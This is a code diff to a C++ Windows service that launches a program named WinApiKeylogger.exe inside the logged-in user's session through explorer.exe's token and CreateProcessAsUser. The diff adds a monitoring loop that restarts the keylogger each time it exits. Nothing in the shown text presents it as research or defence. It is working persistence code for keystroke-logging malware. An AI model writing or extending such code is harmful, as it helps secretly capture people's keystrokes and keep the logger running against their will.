@@ -8,8 +8,10 @@
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "Secur32.lib")
 
+#define WIN32_LEAN_AND_MEAN
 #define TARGET_APP_PATH L"C:\\Users\\phunv33\\source\\repos\\WinApiKeylogger\\x64\\Debug\\WinApiKeylogger.exe"
 #define SERVICE_NAME L"MyService"
+#define WAIT_OBJECT_1 ((STATUS_WAIT_0) + 1)
 
 SERVICE_STATUS        g_ServiceStatus = {};
 SERVICE_STATUS_HANDLE g_StatusHandle = nullptr;
@@ -17,7 +19,8 @@ HANDLE                g_ServiceStopEvent = nullptr;
 
 // Declare the function prototypes
 DWORD GetExplorerPID();
-bool LaunchInUserSession();
+bool LaunchInUserSession(PROCESS_INFORMATION* pi);
+void MonitorAndRestartKeylogger();
 
 void ReportServiceStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint) {
     g_ServiceStatus.dwCurrentState = dwCurrentState;
@@ -69,10 +72,9 @@ void WINAPI ServiceMain(DWORD argc, LPWSTR* argv) {
         }
         Sleep(1000); // Wait 1 second
     }
-    LaunchInUserSession(); // Call your function
 
-    // Wait until stop event is signaled
-    WaitForSingleObject(g_ServiceStopEvent, INFINITE);
+    // Monitor and restart keylogger as needed
+    MonitorAndRestartKeylogger();
 
     // Cleanup
     CloseHandle(g_ServiceStopEvent);
@@ -119,7 +121,11 @@ std::wstring GetUserNameFromToken(HANDLE hToken) {
     return L"";
 }
 
-bool LaunchInUserSession() {
+// Modified to return PROCESS_INFORMATION for monitoring
+bool LaunchInUserSession(PROCESS_INFORMATION* pPi) {
+    if (pPi) {
+        ZeroMemory(pPi, sizeof(PROCESS_INFORMATION));
+    }
     DWORD pid = GetExplorerPID();
     if (!pid) {
         wprintf(L"[-] Could not find explorer.exe\n");
@@ -184,8 +190,11 @@ bool LaunchInUserSession() {
 
     if (!result) {
         wprintf(L"[-] CreateProcessAsUser failed: %lu\n", GetLastError());
-    }
-    else {
+        if (pi.hProcess) CloseHandle(pi.hProcess);
+        if (pi.hThread) CloseHandle(pi.hThread);
+    } else if (pPi) {
+        *pPi = pi; // Return process info to caller
+    } else {
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
     }
@@ -196,6 +205,30 @@ bool LaunchInUserSession() {
     CloseHandle(hToken);
     CloseHandle(hProc);
     return result ? true : false;
+}
+
+// Monitor and restart keylogger process as needed
+void MonitorAndRestartKeylogger() {
+    HANDLE hStopEvent = g_ServiceStopEvent;
+    while (WaitForSingleObject(hStopEvent, 0) == WAIT_TIMEOUT) {
+        PROCESS_INFORMATION pi = { 0 };
+        if (LaunchInUserSession(&pi)) {
+            // Wait for the keylogger process to exit or for the service to be stopped
+            HANDLE handles[2] = { pi.hProcess, hStopEvent };
+            DWORD waitResult = WaitForMultipleObjects(2, handles, FALSE, INFINITE);
+            // Clean up process handles
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            if (waitResult == WAIT_OBJECT_1) {
+                // Service stop event signaled
+                break;
+            }
+            // Otherwise, keylogger exited, so loop to restart
+        } else {
+            // Failed to start, wait a bit before retrying
+            Sleep(5000);
+        }
+    }
 }
 
 int main() {
